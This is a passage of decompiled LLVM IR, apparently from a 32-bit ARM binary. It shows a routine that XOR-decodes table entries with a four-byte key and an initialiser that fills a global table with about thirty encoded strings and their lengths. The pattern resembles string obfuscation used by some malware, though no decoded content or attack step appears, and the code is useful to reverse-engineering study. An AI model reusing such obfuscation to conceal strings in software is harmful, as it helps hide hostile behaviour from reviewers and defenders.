  %v3_1238c = load i8, i8* %v2_1238c, align 1
  %v4_1238c = zext i8 %v3_1238c to i32
  %v0_12390 = load i32, i32* %r7.global-to-local, align 4
  %v1_12390 = add i32 %v0_12390, 1
  %v2_12390 = inttoptr i32 %v1_12390 to i8*
  %v3_12390 = load i8, i8* %v2_12390, align 1
  %v4_12390 = zext i8 %v3_12390 to i32
  %v0_12394 = load i32, i32* %ip.global-to-local, align 4
  %v1_12394 = add i32 %v0_12394, 1
  store i32 %v1_12394, i32* %ip.global-to-local, align 4
  %v4_12398 = mul nuw nsw i32 %v4_12390, 256
  %v5_12398 = or i32 %v4_12398, %v4_1238c
  %v9_1239c = icmp eq i32 %v5_12398, %v1_12394
  store i1 %v9_1239c, i1* @cpsr_z, align 1
  %v8_123a0 = icmp sgt i32 %v5_12398, %v1_12394
  br i1 %v8_123a0, label %dec_label_pc_1234c, label %dec_label_pc_123a4

dec_label_pc_123a4:                               ; preds = %dec_label_pc_1234c
  %v2_123a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_123a4, i32* @r4, align 4
  ret i32 %v1_12340

; uselistorder directives
  uselistorder i32 %v1_12394, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1238c, { 1, 0 }
  uselistorder i32 %v1_12340, { 0, 2, 1 }
  uselistorder i32 %v2_1231c, { 3, 0, 1, 2 }
}

define i32 @function_123b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_123b0:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_123b0 = mul i32 %arg1, 8
  %v3_123b4 = load i32, i32* @r4, align 4
  store i32 %v3_123b4, i32* %stack_var_-20, align 4
  %v3_123c4 = and i32 %v3_123b0, 2040
  %v2_123c8 = add i32 %v3_123c4, ptrtoint (i32* @global_var_1ece4.338 to i32)
  store i32 %v2_123c8, i32* @lr, align 4
  %v1_123d0 = add i32 %v3_123c4, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 4)
  store i32 %v1_123d0, i32* %r7.global-to-local, align 4
  %v2_123d4 = load i32, i32* @global_var_1ea98.341, align 4
  store i32 %v2_123d4, i32* @r2, align 4
  %v2_123d8 = inttoptr i32 %v1_123d0 to i8*
  %v3_123d8 = load i8, i8* %v2_123d8, align 4
  %v4_123d8 = zext i8 %v3_123d8 to i32
  %v1_123dc = add i32 %v3_123c4, add (i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32 5)
  %v2_123dc = inttoptr i32 %v1_123dc to i8*
  %v3_123dc = load i8, i8* %v2_123dc, align 1
  %v4_123dc = zext i8 %v3_123dc to i32
  %v3_123e0 = udiv i32 %v2_123d4, 256
  %v4_123e4 = mul nuw nsw i32 %v4_123dc, 256
  %v5_123e4 = or i32 %v4_123e4, %v4_123d8
  %v7_123e4 = icmp eq i32 %v5_123e4, 0
  %v3_123e8 = udiv i32 %v2_123d4, 65536
  %v1_123ec = urem i32 %v3_123e0, 256
  store i32 %v1_123ec, i32* %r6.global-to-local, align 4
  %v1_123f0 = urem i32 %v3_123e8, 256
  store i32 %v1_123f0, i32* %r5.global-to-local, align 4
  %v3_123f4 = udiv i32 %v2_123d4, 16777216
  store i32 %v3_123f4, i32* %r4.global-to-local, align 4
  %v1_123f8 = urem i32 %v2_123d4, 256
  br i1 %v7_123e4, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_123b0
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_123f8

bb8:                                              ; preds = %dec_label_pc_123b0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_12404, %bb8
  %v2_12410 = phi i32 [ %v1_1244c, %dec_label_pc_12404 ], [ 0, %bb8 ]
  %v0_12404 = phi i32 [ %v0_12444, %dec_label_pc_12404 ], [ %v2_123c8, %bb8 ]
  %v1_12404 = inttoptr i32 %v0_12404 to i32*
  %v2_12404 = load i32, i32* %v1_12404, align 4
  %v2_12408 = add i32 %v2_12404, %v2_12410
  %v3_12408 = inttoptr i32 %v2_12408 to i8*
  %v4_12408 = load i8, i8* %v3_12408, align 1
  %v6_12408 = zext i8 %v4_12408 to i32
  %v2_1240c = xor i32 %v6_12408, %v1_123f8
  %v1_12410 = trunc i32 %v2_1240c to i8
  store i8 %v1_12410, i8* %v3_12408, align 1
  %v0_12414 = load i32, i32* @lr, align 4
  %v1_12414 = inttoptr i32 %v0_12414 to i32*
  %v2_12414 = load i32, i32* %v1_12414, align 4
  %v0_12418 = load i32, i32* %ip.global-to-local, align 4
  %v2_12418 = add i32 %v0_12418, %v2_12414
  %v3_12418 = inttoptr i32 %v2_12418 to i8*
  %v4_12418 = load i8, i8* %v3_12418, align 1
  %v6_12418 = zext i8 %v4_12418 to i32
  %v0_1241c = load i32, i32* %r6.global-to-local, align 4
  %v2_1241c = xor i32 %v0_1241c, %v6_12418
  %v1_12420 = trunc i32 %v2_1241c to i8
  store i8 %v1_12420, i8* %v3_12418, align 1
  %v0_12424 = load i32, i32* @lr, align 4
  %v1_12424 = inttoptr i32 %v0_12424 to i32*
  %v2_12424 = load i32, i32* %v1_12424, align 4
  %v0_12428 = load i32, i32* %ip.global-to-local, align 4
  %v2_12428 = add i32 %v0_12428, %v2_12424
  %v3_12428 = inttoptr i32 %v2_12428 to i8*
  %v4_12428 = load i8, i8* %v3_12428, align 1
  %v6_12428 = zext i8 %v4_12428 to i32
  %v0_1242c = load i32, i32* %r5.global-to-local, align 4
  %v2_1242c = xor i32 %v0_1242c, %v6_12428
  %v1_12430 = trunc i32 %v2_1242c to i8
  store i8 %v1_12430, i8* %v3_12428, align 1
  %v0_12434 = load i32, i32* @lr, align 4
  %v1_12434 = inttoptr i32 %v0_12434 to i32*
  %v2_12434 = load i32, i32* %v1_12434, align 4
  %v0_12438 = load i32, i32* %ip.global-to-local, align 4
  %v2_12438 = add i32 %v0_12438, %v2_12434
  %v3_12438 = inttoptr i32 %v2_12438 to i8*
  %v4_12438 = load i8, i8* %v3_12438, align 1
  %v6_12438 = zext i8 %v4_12438 to i32
  %v0_1243c = load i32, i32* %r4.global-to-local, align 4
  %v2_1243c = xor i32 %v0_1243c, %v6_12438
  %v1_12440 = trunc i32 %v2_1243c to i8
  store i8 %v1_12440, i8* %v3_12438, align 1
  %v0_12444 = load i32, i32* @lr, align 4
  %v1_12444 = add i32 %v0_12444, 4
  %v2_12444 = inttoptr i32 %v1_12444 to i8*
  %v3_12444 = load i8, i8* %v2_12444, align 1
  %v4_12444 = zext i8 %v3_12444 to i32
  %v0_12448 = load i32, i32* %r7.global-to-local, align 4
  %v1_12448 = add i32 %v0_12448, 1
  %v2_12448 = inttoptr i32 %v1_12448 to i8*
  %v3_12448 = load i8, i8* %v2_12448, align 1
  %v4_12448 = zext i8 %v3_12448 to i32
  %v0_1244c = load i32, i32* %ip.global-to-local, align 4
  %v1_1244c = add i32 %v0_1244c, 1
  store i32 %v1_1244c, i32* %ip.global-to-local, align 4
  %v4_12450 = mul nuw nsw i32 %v4_12448, 256
  %v5_12450 = or i32 %v4_12450, %v4_12444
  store i32 %v5_12450, i32* @r2, align 4
  %v8_12458 = icmp sgt i32 %v5_12450, %v1_1244c
  br i1 %v8_12458, label %dec_label_pc_12404, label %dec_label_pc_1245c

dec_label_pc_1245c:                               ; preds = %dec_label_pc_12404
  %v2_1245c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1245c, i32* @r4, align 4
  ret i32 %v1_123f8

; uselistorder directives
  uselistorder i32 %v1_1244c, { 1, 2, 0 }
  uselistorder i32 %v0_12444, { 1, 0 }
  uselistorder i32 %v1_123f8, { 0, 2, 1 }
  uselistorder i32 %v2_123d4, { 3, 0, 1, 2, 4 }
}

define i32 @function_12468() local_unnamed_addr {
dec_label_pc_12468:
  %fp.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v1_12470 = call i32 @function_14140(i32 18)
  store i32 ptrtoint ([19 x i8]* @global_var_16208.345 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ece4.338 to i32), i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v1_12470, i32* @r5, align 4
  %v4_1248c = call i32 @function_12d58(i32 %v1_12470, i32 ptrtoint ([19 x i8]* @global_var_16208.345 to i32), i32 18)
  store i8 18, i8* bitcast (i32* @global_var_1ed00.347 to i8*), align 4
  %v0_1249c = load i32, i32* @r5, align 4
  store i32 %v0_1249c, i32* @global_var_1ecfc.348, align 4
  %v0_124a0 = load i32, i32* @r6, align 4
  %v1_124a0 = trunc i32 %v0_124a0 to i8
  store i8 %v1_124a0, i8* bitcast (i32* @global_var_1ed01.349 to i8*), align 4
  %v1_124a4 = call i32 @function_14140(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 %v1_124a4, i32* @r7, align 4
  %v4_124b8 = call i32 @function_12d58(i32 %v1_124a4, i32 ptrtoint ([3 x i8]* @global_var_1621c.351 to i32), i32 2)
  %v0_124c0 = load i32, i32* @r7, align 4
  store i32 %v0_124c0, i32* @global_var_1ed04.352, align 4
  %v0_124c4 = load i32, i32* @r5, align 4
  %v1_124c4 = trunc i32 %v0_124c4 to i8
  store i8 %v1_124c4, i8* bitcast (i32* @global_var_1ed08.353 to i8*), align 4
  %v0_124c8 = load i32, i32* @r6, align 4
  %v1_124c8 = trunc i32 %v0_124c8 to i8
  store i8 %v1_124c8, i8* bitcast (i32* @global_var_1ed09.354 to i8*), align 4
  %v1_124cc = call i32 @function_14140(i32 18)
  %v0_124d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_124cc, i32* @r7, align 4
  %v4_124dc = call i32 @function_12d58(i32 %v1_124cc, i32 %v0_124d0, i32 18)
  %v0_124e4 = load i32, i32* @r5, align 4
  store i8 18, i8* bitcast (i32* @global_var_1ed78.355 to i8*), align 4
  %v0_124ec = load i32, i32* @r7, align 4
  store i32 %v0_124ec, i32* @global_var_1ed74.356, align 4
  %v0_124f0 = load i32, i32* @r6, align 4
  %v1_124f0 = trunc i32 %v0_124f0 to i8
  store i8 %v1_124f0, i8* bitcast (i32* @global_var_1ed79.357 to i8*), align 4
  %v1_124f4 = call i32 @function_14140(i32 %v0_124e4)
  %v0_124f8 = load i32, i32* @r5, align 4
  store i32 %v1_124f4, i32* @r7, align 4
  %v3_12504 = call i32 @function_12d58(i32 %v1_124f4, i32 ptrtoint (i32* @global_var_16220.359 to i32), i32 %v0_124f8)
  %v0_1250c = load i32, i32* @r7, align 4
  store i32 %v0_1250c, i32* @global_var_1ed7c.360, align 4
  %v0_12510 = load i32, i32* @r5, align 4
  %v1_12510 = trunc i32 %v0_12510 to i8
  store i8 %v1_12510, i8* bitcast (i32* @global_var_1ed80.361 to i8*), align 4
  %v0_12514 = load i32, i32* @r6, align 4
  %v1_12514 = trunc i32 %v0_12514 to i8
  store i8 %v1_12514, i8* bitcast (i32* @global_var_1ed81.362 to i8*), align 4
  %v1_12518 = call i32 @function_14140(i32 15)
  store i32 %v1_12518, i32* @r5, align 4
  %v3_12528 = call i32 @function_12d58(i32 %v1_12518, i32 ptrtoint (i32* @global_var_16224.364 to i32), i32 15)
  store i8 15, i8* bitcast (i32* @global_var_1ecf8.365 to i8*), align 4
  %v0_12538 = load i32, i32* @r5, align 4
  store i32 %v0_12538, i32* @global_var_1ecf4.366, align 4
  %v0_1253c = load i32, i32* @r6, align 4
  %v1_1253c = trunc i32 %v0_1253c to i8
  store i8 %v1_1253c, i8* bitcast (i32* @global_var_1ecf9.367 to i8*), align 4
  %v1_12540 = call i32 @function_14140(i32 29)
  store i32 %v1_12540, i32* @r5, align 4
  %v3_12550 = call i32 @function_12d58(i32 %v1_12540, i32 ptrtoint (i32* @global_var_16234.369 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1ed10.370 to i8*), align 4
  %v0_12560 = load i32, i32* @r5, align 4
  store i32 %v0_12560, i32* @global_var_1ed0c.371, align 4
  %v0_12564 = load i32, i32* @r6, align 4
  %v1_12564 = trunc i32 %v0_12564 to i8
  store i8 %v1_12564, i8* bitcast (i32* @global_var_1ed11.372 to i8*), align 4
  %v1_12568 = call i32 @function_14140(i32 7)
  store i32 7, i32* @r7, align 4
  store i32 %v1_12568, i32* @r5, align 4
  %v4_1257c = call i32 @function_12d58(i32 %v1_12568, i32 ptrtoint ([8 x i8]* @global_var_16254.374 to i32), i32 7)
  %v0_12584 = load i32, i32* @r5, align 4
  store i32 %v0_12584, i32* @global_var_1ed14.375, align 4
  %v0_12588 = load i32, i32* @r7, align 4
  %v1_12588 = trunc i32 %v0_12588 to i8
  store i8 %v1_12588, i8* bitcast (i32* @global_var_1ed18.376 to i8*), align 4
  %v0_1258c = load i32, i32* @r6, align 4
  %v1_1258c = trunc i32 %v0_1258c to i8
  store i8 %v1_1258c, i8* bitcast (i32* @global_var_1ed19.377 to i8*), align 4
  %v1_12590 = call i32 @function_14140(i32 5)
  store i32 %v1_12590, i32* @r5, align 4
  %v4_125a0 = call i32 @function_12d58(i32 %v1_12590, i32 ptrtoint ([6 x i8]* @global_var_1625c.379 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1ed20.380 to i8*), align 4
  %v0_125b0 = load i32, i32* @r5, align 4
  store i32 %v0_125b0, i32* @global_var_1ed1c.381, align 4
  %v0_125b4 = load i32, i32* @r6, align 4
  %v1_125b4 = trunc i32 %v0_125b4 to i8
  store i8 %v1_125b4, i8* bitcast (i32* @global_var_1ed21.382 to i8*), align 4
  %v1_125b8 = call i32 @function_14140(i32 11)
  store i32 %v1_125b8, i32* @r5, align 4
  %v3_125c8 = call i32 @function_12d58(i32 %v1_125b8, i32 ptrtoint (i32* @global_var_16264.384 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1ed28.385 to i8*), align 4
  %v0_125d8 = load i32, i32* @r5, align 4
  store i32 %v0_125d8, i32* @global_var_1ed24.386, align 4
  %v0_125dc = load i32, i32* @r6, align 4
  %v1_125dc = trunc i32 %v0_125dc to i8
  store i8 %v1_125dc, i8* bitcast (i32* @global_var_1ed29.387 to i8*), align 4
  %v1_125e0 = call i32 @function_14140(i32 4)
  store i32 %v1_125e0, i32* @r5, align 4
  %v4_125f0 = call i32 @function_12d58(i32 %v1_125e0, i32 ptrtoint ([5 x i8]* @global_var_16270.389 to i32), i32 4)
  %v0_125f8 = load i32, i32* @r7, align 4
  store i8 4, i8* bitcast (i32* @global_var_1ed30.390 to i8*), align 4
  %v0_12600 = load i32, i32* @r5, align 4
  store i32 %v0_12600, i32* @global_var_1ed2c.391, align 4
  %v0_12604 = load i32, i32* @r6, align 4
  %v1_12604 = trunc i32 %v0_12604 to i8
  store i8 %v1_12604, i8* bitcast (i32* @global_var_1ed31.392 to i8*), align 4
  %v1_12608 = call i32 @function_14140(i32 %v0_125f8)
  %v0_1260c = load i32, i32* @r7, align 4
  store i32 %v1_12608, i32* @r5, align 4
  %v4_12618 = call i32 @function_12d58(i32 %v1_12608, i32 ptrtoint ([8 x i8]* @global_var_16278.394 to i32), i32 %v0_1260c)
  %v0_12620 = load i32, i32* @r5, align 4
  store i32 %v0_12620, i32* @global_var_1ed34.395, align 4
  %v0_12624 = load i32, i32* @r7, align 4
  %v1_12624 = trunc i32 %v0_12624 to i8
  store i8 %v1_12624, i8* bitcast (i32* @global_var_1ed38.396 to i8*), align 4
  %v0_12628 = load i32, i32* @r6, align 4
  %v1_12628 = trunc i32 %v0_12628 to i8
  store i8 %v1_12628, i8* bitcast (i32* @global_var_1ed39.397 to i8*), align 4
  %v1_1262c = call i32 @function_14140(i32 8)
  store i32 %v1_1262c, i32* @r5, align 4
  %v4_1263c = call i32 @function_12d58(i32 %v1_1262c, i32 ptrtoint ([9 x i8]* @global_var_16280.399 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1ed40.400 to i8*), align 4
  %v0_1264c = load i32, i32* @r5, align 4
  store i32 %v0_1264c, i32* @global_var_1ed3c.401, align 4
  %v0_12650 = load i32, i32* @r6, align 4
  %v1_12650 = trunc i32 %v0_12650 to i8
  store i8 %v1_12650, i8* bitcast (i32* @global_var_1ed41.402 to i8*), align 4
  %v1_12654 = call i32 @function_14140(i32 13)
  store i32 %v1_12654, i32* @r5, align 4
  %v3_12664 = call i32 @function_12d58(i32 %v1_12654, i32 ptrtoint (i32* @global_var_1628c.404 to i32), i32 13)
  store i8 13, i8* bitcast (i32* @global_var_1ed48.405 to i8*), align 4
  %v0_12674 = load i32, i32* @r5, align 4
  store i32 %v0_12674, i32* @global_var_1ed44.406, align 4
  %v0_12678 = load i32, i32* @r6, align 4
  %v1_12678 = trunc i32 %v0_12678 to i8
  store i8 %v1_12678, i8* bitcast (i32* @global_var_1ed49.407 to i8*), align 4
  %v1_1267c = call i32 @function_14140(i32 10)
  store i32 10, i32* %r8.global-to-local, align 4
  store i32 %v1_1267c, i32* @r5, align 4
  %v4_12690 = call i32 @function_12d58(i32 %v1_1267c, i32 ptrtoint ([11 x i8]* @global_var_1629c.409 to i32), i32 10)
  %v0_12698 = load i32, i32* @r5, align 4
  store i32 %v0_12698, i32* @global_var_1ed4c.410, align 4
  store i8 10, i8* bitcast (i32* @global_var_1ed50.411 to i8*), align 4
  %v0_126a0 = load i32, i32* @r6, align 4
  %v1_126a0 = trunc i32 %v0_126a0 to i8
  store i8 %v1_126a0, i8* bitcast (i32* @global_var_1ed51.412 to i8*), align 4
  %v1_126a4 = call i32 @function_14140(i32 10)
  %v0_126ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_126a4, i32* @r5, align 4
  %v4_126b4 = call i32 @function_12d58(i32 %v1_126a4, i32 ptrtoint ([11 x i8]* @global_var_162a8.414 to i32), i32 %v0_126ac)
  %v0_126bc = load i32, i32* @r5, align 4
  store i32 %v0_126bc, i32* @global_var_1ed54.415, align 4
  %v1_126c0 = trunc i32 %v0_126ac to i8
  store i8 %v1_126c0, i8* bitcast (i32* @global_var_1ed58.416 to i8*), align 4
  %v0_126c4 = load i32, i32* @r6, align 4
  %v1_126c4 = trunc i32 %v0_126c4 to i8
  store i8 %v1_126c4, i8* bitcast (i32* @global_var_1ed59.417 to i8*), align 4
  %v1_126c8 = call i32 @function_14140(i32 33)
  store i32 %v1_126c8, i32* @r5, align 4
  %v3_126d8 = call i32 @function_12d58(i32 %v1_126c8, i32 ptrtoint (i32* @global_var_162b4.419 to i32), i32 33)
  store i8 33, i8* bitcast (i32* @global_var_1ed60.420 to i8*), align 4
  %v0_126e8 = load i32, i32* @r5, align 4
  store i32 %v0_126e8, i32* @global_var_1ed5c.421, align 4
  %v0_126ec = load i32, i32* @r6, align 4
  %v1_126ec = trunc i32 %v0_126ec to i8
  store i8 %v1_126ec, i8* bitcast (i32* @global_var_1ed61.422 to i8*), align 4
  %v1_126f0 = call i32 @function_14140(i32 8)
  store i32 %v1_126f0, i32* @r5, align 4
  %v4_12700 = call i32 @function_12d58(i32 %v1_126f0, i32 ptrtoint ([9 x i8]* @global_var_162d8.424 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1ed68.425 to i8*), align 4
  %v0_12710 = load i32, i32* @r5, align 4
  store i32 %v0_12710, i32* @global_var_1ed64.426, align 4
  %v0_12714 = load i32, i32* @r6, align 4
  %v1_12714 = trunc i32 %v0_12714 to i8
  store i8 %v1_12714, i8* bitcast (i32* @global_var_1ed69.427 to i8*), align 4
  %v1_12718 = call i32 @function_14140(i32 11)
  store i32 %v1_12718, i32* @r5, align 4
  %v4_12728 = call i32 @function_12d58(i32 %v1_12718, i32 ptrtoint ([12 x i8]* @global_var_162e4.429 to i32), i32 11)
  store i8 11, i8* bitcast (i32* @global_var_1ed70.430 to i8*), align 4
  %v0_12738 = load i32, i32* @r5, align 4
  store i32 %v0_12738, i32* @global_var_1ed6c.431, align 4
  %v0_1273c = load i32, i32* @r6, align 4
  %v1_1273c = trunc i32 %v0_1273c to i8
  store i8 %v1_1273c, i8* bitcast (i32* @global_var_1ed71.432 to i8*), align 4
  %v1_12740 = call i32 @function_14140(i32 6)
  store i32 %v1_12740, i32* @r5, align 4
  %v4_12750 = call i32 @function_12d58(i32 %v1_12740, i32 ptrtoint ([7 x i8]* @global_var_162f0.434 to i32), i32 6)
  %v0_12758 = load i32, i32* @r7, align 4
  store i8 6, i8* bitcast (i32* @global_var_1ed88.435 to i8*), align 4
  %v0_12760 = load i32, i32* @r5, align 4
  store i32 %v0_12760, i32* @global_var_1ed84.436, align 4
  %v0_12764 = load i32, i32* @r6, align 4
  %v1_12764 = trunc i32 %v0_12764 to i8
  store i8 %v1_12764, i8* bitcast (i32* @global_var_1ed89.437 to i8*), align 4
  %v1_12768 = call i32 @function_14140(i32 %v0_12758)
  %v0_1276c = load i32, i32* @r7, align 4
  store i32 %v1_12768, i32* @r5, align 4
  %v4_12778 = call i32 @function_12d58(i32 %v1_12768, i32 ptrtoint ([8 x i8]* @global_var_162f8.439 to i32), i32 %v0_1276c)
  %v0_1277c = load i32, i32* @r7, align 4
  %v0_12780 = load i32, i32* @r5, align 4
  store i32 %v0_12780, i32* @global_var_1ed8c.440, align 4
  %v1_12784 = trunc i32 %v0_1277c to i8
  store i8 %v1_12784, i8* bitcast (i32* @global_var_1ed90.441 to i8*), align 4
  %v0_12788 = load i32, i32* @r6, align 4
  %v1_12788 = trunc i32 %v0_12788 to i8
  store i8 %v1_12788, i8* bitcast (i32* @global_var_1ed91.442 to i8*), align 4
  %v1_1278c = call i32 @function_14140(i32 %v0_1277c)
  %v0_12790 = load i32, i32* @r7, align 4
  store i32 %v1_1278c, i32* @r5, align 4
  %v4_1279c = call i32 @function_12d58(i32 %v1_1278c, i32 ptrtoint ([8 x i8]* @global_var_16300.444 to i32), i32 %v0_12790)
  %v0_127a4 = load i32, i32* @r5, align 4
  store i32 %v0_127a4, i32* @global_var_1ed94.445, align 4
  %v0_127a8 = load i32, i32* @r7, align 4
  %v1_127a8 = trunc i32 %v0_127a8 to i8
  store i8 %v1_127a8, i8* bitcast (i32* @global_var_1ed98.446 to i8*), align 4
  %v0_127ac = load i32, i32* @r6, align 4
  %v1_127ac = trunc i32 %v0_127ac to i8
  store i8 %v1_127ac, i8* bitcast (i32* @global_var_1ed99.447 to i8*), align 4
  %v1_127b0 = call i32 @function_14140(i32 3)
  store i32 %v1_127b0, i32* @r5, align 4
  %v4_127c0 = call i32 @function_12d58(i32 %v1_127b0, i32 ptrtoint ([4 x i8]* @global_var_16308.449 to i32), i32 3)
  store i8 3, i8* bitcast (i32* @global_var_1eda0.450 to i8*), align 4
  %v0_127d0 = load i32, i32* @r5, align 4
  store i32 %v0_127d0, i32* @global_var_1ed9c.451, align 4
  %v0_127d4 = load i32, i32* @r6, align 4
  %v1_127d4 = trunc i32 %v0_127d4 to i8
  store i8 %v1_127d4, i8* bitcast (i32* @global_var_1eda1.452 to i8*), align 4
  %v1_127d8 = call i32 @function_14140(i32 19)
  store i32 %v1_127d8, i32* @r5, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_127ec = call i32 @function_12d58(i32 %v1_127d8, i32 ptrtoint (i32* @global_var_1630c.454 to i32), i32 19)
  %v0_127f4 = load i32, i32* @r5, align 4
  store i32 %v0_127f4, i32* @global_var_1eda4.455, align 4
  store i8 19, i8* bitcast (i32* @global_var_1eda8.456 to i8*), align 4
  %v0_127fc = load i32, i32* @r6, align 4
  %v1_127fc = trunc i32 %v0_127fc to i8
  store i8 %v1_127fc, i8* bitcast (i32* @global_var_1eda9.457 to i8*), align 4
  %v1_12800 = call i32 @function_14140(i32 24)
  store i32 %v1_12800, i32* @r5, align 4
  %v3_12810 = call i32 @function_12d58(i32 %v1_12800, i32 ptrtoint (i32* @global_var_16320.459 to i32), i32 24)
  store i8 24, i8* bitcast (i32* @global_var_1edb0.460 to i8*), align 4
  %v0_12820 = load i32, i32* @r5, align 4
  store i32 %v0_12820, i32* @global_var_1edac.461, align 4
  %v0_12824 = load i32, i32* @r6, align 4
  %v1_12824 = trunc i32 %v0_12824 to i8
  store i8 %v1_12824, i8* bitcast (i32* @global_var_1edb1.462 to i8*), align 4
  %v1_12828 = call i32 @function_14140(i32 9)
  store i32 %v1_12828, i32* @r5, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  %v4_1283c = call i32 @function_12d58(i32 %v1_12828, i32 ptrtoint ([10 x i8]* @global_var_1633c.464 to i32), i32 9)
  %v0_12844 = load i32, i32* @r5, align 4
  store i32 %v0_12844, i32* @global_var_1edb4.465, align 4
  store i8 9, i8* bitcast (i32* @global_var_1edb8.466 to i8*), align 4
  %v0_1284c = load i32, i32* @r6, align 4
  %v1_1284c = trunc i32 %v0_1284c to i8
  store i8 %v1_1284c, i8* bitcast (i32* @global_var_1edb9.467 to i8*), align 4
  %v1_12850 = call i32 @function_14140(i32 16)
  store i32 %v1_12850, i32* @r5, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_12864 = call i32 @function_12d58(i32 %v1_12850, i32 ptrtoint (i32* @global_var_16348.469 to i32), i32 16)
  %v0_1286c = load i32, i32* @r5, align 4
  store i32 %v0_1286c, i32* @global_var_1edbc.470, align 4
  store i8 16, i8* bitcast (i32* @global_var_1edc0.471 to i8*), align 4
  %v0_12874 = load i32, i32* @r6, align 4
  %v1_12874 = trunc i32 %v0_12874 to i8
  store i8 %v1_12874, i8* bitcast (i32* @global_var_1edc1.472 to i8*), align 4
  %v1_12878 = call i32 @function_14140(i32 22)
  store i32 %v1_12878, i32* @r5, align 4
  %v3_12888 = call i32 @function_12d58(i32 %v1_12878, i32 ptrtoint (i32* @global_var_1635c.474 to i32), i32 22)
  store i8 22, i8* bitcast (i32* @global_var_1edc8.475 to i8*), align 4
  %v0_12898 = load i32, i32* @r5, align 4
  store i32 %v0_12898, i32* @global_var_1edc4.476, align 4
  %v0_1289c = load i32, i32* @r6, align 4
  %v1_1289c = trunc i32 %v0_1289c to i8
  store i8 %v1_1289c, i8* bitcast (i32* @global_var_1edc9.477 to i8*), align 4
  %v1_128a0 = call i32 @function_14140(i32 21)
  store i32 %v1_128a0, i32* @r5, align 4
  %v3_128b0 = call i32 @function_12d58(i32 %v1_128a0, i32 ptrtoint (i32* @global_var_16374.479 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1edd0.480 to i8*), align 4
  %v0_128c0 = load i32, i32* @r5, align 4
  store i32 %v0_128c0, i32* @global_var_1edcc.481, align 4
  %v0_128c4 = load i32, i32* @r6, align 4
  %v1_128c4 = trunc i32 %v0_128c4 to i8
  store i8 %v1_128c4, i8* bitcast (i32* @global_var_1edd1.482 to i8*), align 4
  %v1_128c8 = call i32 @function_14140(i32 17)
  store i32 %v1_128c8, i32* @r5, align 4
  %v4_128d8 = call i32 @function_12d58(i32 %v1_128c8, i32 ptrtoint ([18 x i8]* @global_var_1638c.484 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1edd8.485 to i8*), align 4
  %v0_128e8 = load i32, i32* @r5, align 4
  store i32 %v0_128e8, i32* @global_var_1edd4.486, align 4
  %v0_128ec = load i32, i32* @r6, align 4
  %v1_128ec = trunc i32 %v0_128ec to i8
  store i8 %v1_128ec, i8* bitcast (i32* @global_var_1edd9.487 to i8*), align 4
  %v1_128f0 = call i32 @function_14140(i32 12)
  %v0_128fc = load i32, i32* @r7, align 4
  %v1_128fc = add i32 %v0_128fc, 5
  store i32 %v1_128fc, i32* @r7, align 4
  store i32 %v1_128f0, i32* @r5, align 4
  %v3_12904 = call i32 @function_12d58(i32 %v1_128f0, i32 ptrtoint (i32* @global_var_163a0.489 to i32), i32 12)
  %v0_1290c = load i32, i32* @r5, align 4
  store i32 %v0_1290c, i32* @global_var_1eddc.490, align 4
  %v0_12910 = load i32, i32* @r7, align 4
  %v1_12910 = trunc i32 %v0_12910 to i8
  store i8 %v1_12910, i8* bitcast (i32* @global_var_1ede0.491 to i8*), align 4
  %v0_12914 = load i32, i32* @r6, align 4
  %v1_12914 = trunc i32 %v0_12914 to i8
  store i8 %v1_12914, i8* bitcast (i32* @global_var_1ede1.492 to i8*), align 4
  %v1_12918 = call i32 @function_14140(i32 23)
  store i32 %v1_12918, i32* @r5, align 4
  %v3_12928 = call i32 @function_12d58(i32 %v1_12918, i32 ptrtoint (i32* @global_var_163b0.494 to i32), i32 23)
  store i8 23, i8* bitcast (i32* @global_var_1ede8.495 to i8*), align 4
  %v0_12938 = load i32, i32* @r5, align 4
  store i32 %v0_12938, i32* @global_var_1ede4.496, align 4
  %v0_1293c = load i32, i32* @r6, align 4
  %v1_1293c = trunc i32 %v0_1293c to i8
  store i8 %v1_1293c, i8* bitcast (i32* @global_var_1ede9.497 to i8*), align 4
  %v1_12940 = call i32 @function_14140(i32 83)
  store i32 %v1_12940, i32* @r5, align 4
  %v3_12950 = call i32 @function_12d58(i32 %v1_12940, i32 ptrtoint (i32* @global_var_163c8.499 to i32), i32 83)
  store i8 83, i8* bitcast (i32* @global_var_1edf0.500 to i8*), align 4
  %v0_12960 = load i32, i32* @r5, align 4
  store i32 %v0_12960, i32* @global_var_1edec.501, align 4
  %v0_12964 = load i32, i32* @r6, align 4
  %v1_12964 = trunc i32 %v0_12964 to i8
  store i8 %v1_12964, i8* bitcast (i32* @global_var_1edf1.502 to i8*), align 4
  %v1_12968 = call i32 @function_14140(i32 32)
  store i32 %v1_12968, i32* @r5, align 4
